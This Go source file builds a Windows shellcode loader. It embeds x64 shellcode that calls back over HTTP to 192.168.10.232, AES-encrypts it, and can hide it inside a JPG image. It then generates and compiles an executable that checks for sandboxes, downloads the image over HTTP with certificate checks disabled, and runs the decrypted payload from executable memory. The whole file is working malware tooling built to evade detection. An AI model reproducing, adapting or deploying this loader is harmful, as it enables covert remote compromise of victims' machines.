package main

import (
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"shellcodeloading/aes"
)

var shellcodeString = "\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x59\x1b\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x64\x39\x7a\x46\x00\xa2\x89\xbc\x4b\xf7\x54\xe3\x17\xc6\x02\x98\x33\x89\x30\xc7\x06\xc4\xe0\xa4\xd1\x23\xdc\x37\xe0\xf3\x85\x27\x3c\x48\x26\x7b\x94\x78\xba\x1e\xaa\x20\x9e\xf9\x93\xd6\x8b\x03\xa1\x32\x3f\x37\xe1\x29\xc2\xe1\xac\xb5\x03\x00\xcc\x9b\x9c\x7f\x3b\x0d\xd0\xbe\x3e\x03\x74\x5a\xd5\x5e\x3a\xde\x08\xf1\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x34\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x38\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x35\x2e\x31\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x34\x2e\x30\x3b\x20\x49\x6e\x66\x6f\x50\x61\x74\x68\x2e\x32\x3b\x20\x2e\x4e\x45\x54\x34\x2e\x30\x43\x3b\x20\x2e\x4e\x45\x54\x34\x2e\x30\x45\x29\x0d\x0a\x00\x20\xce\x68\x87\xe0\x33\xdb\xb8\xd2\x32\xcc\x98\x6d\x88\xbf\xdb\xa6\xad\x7d\x7b\xf1\xfa\x30\xc0\xbe\xac\x5d\xb2\x30\x6d\x74\x93\xf0\x31\xfc\xf9\x81\x52\x29\xd9\x83\x31\x7c\x35\x3f\x4c\xf8\x8b\xbc\xf6\x73\xb8\xf0\xca\xc3\xcf\x41\xf0\x9a\x20\x09\xe9\x4b\xb1\xc9\x53\x5a\x6f\x79\xdc\x9a\x92\x9a\x55\x9b\x0c\x9b\x62\xd7\xa6\x6d\xd4\x81\x07\x2f\x6c\x7d\x95\xcd\x4a\x7a\x82\x2c\xa0\x47\x45\xcd\x94\x85\x34\x30\x7b\xcf\x28\x3c\x04\x3f\x4a\xb3\x9e\x2c\x8c\x78\xa6\x39\xa9\x4e\x29\x33\x4e\xc5\x82\x72\x06\x20\x3e\x3c\x4b\x27\xb2\xc0\x8d\xea\x05\xbe\x39\x3b\x83\x32\xbb\xc1\x33\x4c\xfb\xae\x49\xa0\x9c\x36\x15\xf8\x2e\xfd\x62\xcd\x75\x55\x0d\x73\xf1\x1a\xa8\x24\xf8\xb5\x53\xa0\xbe\x79\xe2\x5f\x40\x03\x9a\xd3\xfc\x46\x5b\xaa\xbd\x85\xbb\xc3\x5b\x9f\x9b\x74\x85\x67\xe4\xaf\x6d\xaa\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x30\x2e\x32\x33\x32\x00\x19\x69\xa0\x8d"

// loadingLogo /*加载logo shellCodeLoading
func loadingLogo() {
	fmt.Println(`
       .__           .__  .__                   .___       .__                    .___.__                
  _____|  |__   ____ |  | |  |   ____  ____   __| _/____   |  |   _________     __| _/|__| ____    ____  
 /  ___/  |  \_/ __ \|  | |  | _/ ___\/  _ \ / __ |/ __ \  |  |  /  _ \__  \   / __ | |  |/    \  / ___\ 
 \___ \|   Y  \  ___/|  |_|  |_\  \__(  <_> ) /_/ \  ___/  |  |_(  <_> ) __ \_/ /_/ | |  |   |  \/ /_/  >
/____  >___|  /\___  >____/____/\___  >____/\____ |\___  > |____/\____(____  /\____ | |__|___|  /\___  / 
     \/     \/     \/               \/           \/    \/                  \/      \/         \//_____/`)
}
/*
user选择shellcode方式
 */
func userChoose() {
	fmt.Println(`
1.AES shellcode(aes shellcode在exe文件中)
2.AES+jpg shellcode在图片中，木马exe打开路径(或http)可选择是否写死在shellcode中`)
	var userInput int
	fmt.Println("请输入你的选择1~2")
	fmt.Scanln(&userInput)
	switch userInput {
	case 1:
		writeShellGo(fixedShellcode())
	case 2:
		userChooseFile()
	default:
		fmt.Println("请输入1~2！！！")
		userChoose()
	}
}
/*
user选择file是否写死在shellcode中
 */
func userChooseFile(){
	fmt.Println(`
1.打开imageShellcode路径写死在shellcode.exe中)
2.imageShellcode路径以参数的形式`)
	var userInput int
	fmt.Println("请输入你的选择1~2")
	fmt.Scanln(&userInput)
	switch userInput {
	case 1:
		writeShellGo(fixedPath())
		//fixedPath()
	case 2:
		writeShellGo(remotePath())
	default:
		fmt.Println("请输入1~2！！！")
		userChoose()
	}
}


/*
根据shellcode加载方式生成shellcode.go
shellcode.go 用于生成shellcode.exe
参数说明:
shellcode:如果存在shellcode写死在exe文件
aesMd5:如果存在shellcode写死在exe文件,aes对称密码密钥
pathImage:image的路径可以写死在shellcode.exe中也可加选项,可以远程也可以本地
 */
func writeShellGo(shellcode string,aesMd5 string,pathImage string){
	var writeGO string
	writeGO =
`package main

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"regexp"
	aesCode "shellcodeloading/aes"
	"shellcodeloading/checkSandbox"
	"unsafe"
	
	"syscall"
	"time"
)
const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)
var (
	kernel32      = syscall.MustLoadDLL("kernel32.dll")
	ntdll         = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
	RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")
)
/*
检测是否发发生错误
*/
func checkErr(err error) {
	if err != nil {
		if err.Error() != "The operation completed successfully." {
			println(err.Error())
			os.Exit(1)
		}
	}
}
/*
检测文件是否存在
*/
func checkFileIsExist(filename string) bool{
	if _,err := os.Stat(filename);os.IsNotExist(err){
		return false
	}
	return true
}
/*
读取image中的shellcode
*/
func readImageShellcode(filename string)(shellcode string,aesMd5 string){
	match, _ := regexp.MatchString("http", filename)
	if match{
		tr := &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		}
		client := &http.Client{
			Transport: tr,
			Timeout: time.Second * 5,
		}
		fmt.Println("Visiting" + filename)
		resp,err := client.Get(filename)
		if err != nil{
			fmt.Println("error"+"Visiting" + filename)
			os.Exit(0)
		}
		defer resp.Body.Close()
		Split := "hello"
		byteImage,_ := ioutil.ReadAll(resp.Body)
		aesMd5 = string(byteImage[len(byteImage)-32:])
		byteImage = byteImage[:len(byteImage)-32]
		shellcodeAes := bytes.Split(byteImage,[]byte(Split))
		if len(shellcodeAes) != 2 {
			os.Exit(0)
		}
		shellcode = string(shellcodeAes[1])
	}else {
		var f *os.File
		if checkFileIsExist(filename) {
			f, _ = os.OpenFile(filename, os.O_APPEND, 0666)
			defer f.Close()
			Split := "hello" //已hello为标志分割线
			byteImage, _ := ioutil.ReadAll(f)
			aesMd5 = string(byteImage[len(byteImage)-32:])
			byteImage = byteImage[:len(byteImage)-32]
			shellcodeAes := bytes.Split(byteImage, []byte(Split))
			if len(shellcodeAes) != 2 {
				os.Exit(0)
			}
			shellcode = string(shellcodeAes[1])
		}
	}
	return shellcode,aesMd5
}
func main() {
	checkSandbox.CheckSandbox() //沙盒虚拟机环境检验，可注入掉
	var shellcode []byte
	shellcodeBuf:= "`+ shellcode +`"
	aesMd5 := "`+aesMd5+`"
	pathImage := "`+pathImage+`"
	hello := "hello world!"
	fmt.Println(hello)
	if shellcodeBuf != "" && aesMd5 != ""{
		encryptCode := aesCode.AesDecrypt(shellcodeBuf,aesMd5)
		shellcode = []byte(encryptCode)
	}
	if pathImage != ""{
		shellcodeBuf,aesMd5 = readImageShellcode(pathImage)
		encryptCode := aesCode.AesDecrypt(shellcodeBuf,aesMd5)
		shellcode = []byte(encryptCode)
	}
	if len(os.Args) > 1 {
		shellcodeBuf,aesMd5 = readImageShellcode(string(os.Args[1]))
		encryptCode := aesCode.AesDecrypt(shellcodeBuf,aesMd5)
		shellcode = []byte(encryptCode)
	}
	if string(shellcode) == ""{
		os.Exit(0)
	}
	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		checkErr(err)
	}
	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	checkErr(err)
	syscall.Syscall(addr, 0, 0, 0, 0)
}`
	var f * os.File
	filename := "./output/shellcode.go"
	f,_ = os.Create(filename)
	defer f.Close()
	_,err:= f.Write([]byte(writeGO))
	if err != nil {
		fmt.Println("writeGo []byte into output/shellcode.go error")
		os.Exit(0)
	}else {
		fmt.Println("shellcode.go写入成功")
	}
}
/*
aesShellcode 生成aes对称密钥，返回密文和密钥
 */
func aesShellcode() (aesShellcode string,aesMd5 string){
	if shellcodeString == ""{
		fmt.Println("请将填入shellcode shellcodeloading.go首部变量")
		os.Exit(0)
	}
	encryptShellcode := aesCode.AesEncrypt(string(shellcodeString),aesCode.GetMD5Encode(string(shellcodeString)))
	fmt.Println("生成aesshellcode 对称密码aesMd5 successful!")
	return encryptShellcode,aesCode.GetMD5Encode(string(shellcodeString))
}
/*
固定shellcode生成write参数
 */
func fixedShellcode() (encryptShellcode string,aesMd5 string,pathImage string){
	encryptShellcode,aesMd5 = aesShellcode()
	return encryptShellcode,aesMd5,pathImage
}
/*
检测文件是否存在
*/
func checkFileIsExist(filename string) bool{
	if _,err := os.Stat(filename);os.IsNotExist(err){
		return false
	}
	return true
}
/*
图片中加shellcode
 */
func injectimage(shellcode string,aesMd5 string){
	var f * os.File
	var userInput string
	fmt.Println("请输入你的选择图片地址建议使用相对路径")
	fmt.Scanln(&userInput)
	if !checkFileIsExist(userInput){
		fmt.Println("图片地址不存在,请检查文件，重新输入")
		injectimage(shellcode,aesMd5)
		os.Exit(0)
	}
	f,_ = os.OpenFile(userInput,os.O_APPEND,0666)
	imageData,_:= ioutil.ReadAll(f)
	defer f.Close()
	outputname := "output/lnng.jpg"
	if checkFileIsExist(outputname) {
		fmt.Println("output image is Exist,请删除output/lnng.jpg")
		injectimage(shellcode,aesMd5)
		//os.Exit(1)
	}else {
		fp,err := os.Create(outputname)
		if err !=nil{
			fmt.Println("output image Creat error")
			os.Exit(1)
		}
		_,err = fp.Write(imageData)
		if err !=nil {
			fmt.Println("image []byte into output error")
			os.Exit(0)
		}
		Split := "hello"
		_,err = fp.Write([]byte(Split))
		if err != nil{
			fmt.Println("Split []byte into output image error")
			os.Exit(0)
		}
		_,err = fp.Write([]byte(shellcode))
		if err !=nil{
			fmt.Println("image []byte into output error")
			os.Exit(0)
		}
		_,err = fp.Write([]byte(aesMd5))
		if err !=nil {
			fmt.Println("aesMd5 []byte into output error")
			os.Exit(0)
		}
		fmt.Println("图片加shellcode对称密钥successful!")
		fmt.Println("图片shellcode输出路径为output/lnng.jpg")
		}
}
/*
shellcodeImage 固定shellcode.exe imagePath
 */
func fixedPath() (encryptShellcode string,aesMd5 string,pathImage string){
	injectimage(aesShellcode())
	fmt.Println("请输入shellcode.exe固定image地址 如./lnng.jpg 注:相对于shellcode.exe文件 或 htttp:127.0.0.1/lnng.top")
	var userInput string
	fmt.Scanln(&userInput)
	return encryptShellcode,aesMd5,userInput
}
/*
远程选择加载shellcode位置可远程可本地区分根据是否有http
 */
func remotePath()(encryptShellcode string,aesMd5 string,pathImage string){
	injectimage(aesShellcode())
	return encryptShellcode,aesMd5,pathImage
}
/*
调用系统命令执行compileShellGo.bat对生成的output/shellcode.go进行编译
 */
func compileShellGo(){
	cmd := "cd output&&.\\compileShellGo.bat"
	_, err := exec.Command("cmd","/c",cmd).Output()
	if err !=nil{
		fmt.Println("go build shellcode.go error")
		os.Exit(0)
	}else {
		fmt.Println("shellcode.exe 编译成功")
	}
}

func main(){
	loadingLogo()
	userChoose()
	compileShellGo()
}